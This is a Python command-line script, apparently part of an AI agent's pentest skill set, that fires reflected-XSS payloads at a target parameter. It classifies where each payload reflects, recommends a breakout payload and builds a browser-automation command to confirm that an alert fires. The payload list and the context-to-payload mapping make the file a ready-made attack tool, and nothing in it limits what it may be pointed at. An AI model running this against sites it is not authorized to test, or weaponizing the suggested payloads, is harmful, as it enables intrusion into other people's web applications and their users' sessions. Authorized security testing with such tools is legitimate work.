#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import json
import urllib.error
import urllib.parse
import urllib.request

PROBES = [
    {"id": "marker", "payload": "XSSMARK"},
    {"id": "img_onerror", "payload": "<img src=x onerror=alert(1)>"},
    {"id": "attr_break", "payload": '"><svg/onload=alert(1)>'},
    {"id": "script_tag", "payload": "<script>alert(1)</script>"},
    {"id": "script_breakout", "payload": "</script><script>alert(1)</script>"},
]


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Probe a target for reflected XSS context.")
    parser.add_argument("--target", required=True, help="Endpoint URL")
    parser.add_argument("--param", required=True, help="Reflected parameter name")
    parser.add_argument("--baseline", default="guest", help="Baseline benign value")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--show-bodies", action="store_true")
    return parser.parse_args()


def send_request(target: str, param: str, payload: str, method: str, timeout: float) -> tuple[int, str]:
    encoded = urllib.parse.urlencode({param: payload})
    request_url = target
    data = None

    if method == "GET":
        separator = "&" if urllib.parse.urlparse(target).query else "?"
        request_url = f"{target}{separator}{encoded}"
    else:
        data = encoded.encode("utf-8")

    request = urllib.request.Request(request_url, data=data, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="replace")


def summarize(status: int, body: str) -> dict[str, object]:
    return {
        "status": status,
        "length": len(body),
        "sha256": hashlib.sha256(body.encode("utf-8")).hexdigest()[:16],
        "preview": body[:160].replace("\n", "\\n"),
    }


def classify_reflection_context(body: str, payload: str) -> str | None:
    idx = body.find(payload)
    if idx < 0:
        return None

    if payload.startswith("<") and body[idx:idx + len(payload)] == payload:
        return "html_text"

    script_start = body.rfind("<script", 0, idx)
    script_end = body.rfind("</script>", 0, idx)
    if script_start != -1 and script_start > script_end:
        return "script_block"

    tag_start = body.rfind("<", 0, idx)
    tag_end = body.find(">", idx)
    if tag_start != -1:
        opening_tag_end = body.find(">", tag_start)
        if opening_tag_end != -1 and idx < opening_tag_end:
            before_payload = body[tag_start:idx]
            if before_payload.count('"') % 2 == 1:
                return "attr_double"
            if before_payload.count("'") % 2 == 1:
                return "attr_single"
            return "tag_markup"

    return "html_text"


def recommend_follow_up(context_name: str | None) -> tuple[str, str]:
    mapping = {
        "html_text": (
            "Reflected XSS is plausible in HTML text context",
            "<script>alert(1)</script>",
        ),
        "attr_double": (
            "Break out of the quoted attribute and use an event handler",
            '"><svg/onload=alert(1)>',
        ),
        "attr_single": (
            "Break out of the single-quoted attribute and use an event handler",
            "'><svg/onload=alert(1)>",
        ),
        "tag_markup": (
            "The payload is inside tag markup; try an event handler or a quote break",
            'x" onmouseover="alert(1)',
        ),
        "script_block": (
            "The payload lands in a script block; try closing the script and reopening one",
            "</script><script>alert(1)</script>",
        ),
    }
    return mapping.get(
        context_name,
        (
            "No direct reflection found; re-check DOM sinks or stored sinks",
            "Use browser_ctl.py xss-test on any client-side sink candidate",
        ),
    )


def main() -> int:
    args = parse_args()
    baseline_status, baseline_body = send_request(args.target, args.param, args.baseline, args.method, args.timeout)

    bodies: dict[str, str] = {"baseline": baseline_body}
    output: dict[str, object] = {
        "target": args.target,
        "param": args.param,
        "baseline": summarize(baseline_status, baseline_body),
        "probes": [],
    }

    strongest_context = None
    for probe in PROBES:
        status, body = send_request(args.target, args.param, probe["payload"], args.method, args.timeout)
        bodies[probe["id"]] = body
        context_name = classify_reflection_context(body, probe["payload"])
        if strongest_context is None and context_name:
            strongest_context = context_name
        output["probes"].append(
            {
                "id": probe["id"],
                "payload": probe["payload"],
                "summary": summarize(status, body),
                "analysis": {
                    "reflected": context_name is not None,
                    "context": context_name,
                },
            }
        )

    assessment, next_payload = recommend_follow_up(strongest_context)
    output["likely_xss_shape"] = assessment
    output["recommended_next_payload"] = next_payload
    if strongest_context:
        encoded = urllib.parse.quote(next_payload, safe="")
        output["recommended_browser_check"] = (
            "python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py "
            f"xss-test --url '{args.target}?{args.param}={encoded}' --wait-for-alert 2000"
        )
    else:
        output["recommended_browser_check"] = (
            "Use browser_ctl.py xss-test on any discovered DOM sink or stored sink candidate"
        )

    print(json.dumps(output, ensure_ascii=False, indent=2))

    if args.show_bodies:
        print("\n[baseline body]\n")
        print(bodies["baseline"])
        for probe in PROBES:
            print(f"\n[{probe['id']} body]\n")
            print(bodies[probe["id"]])

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
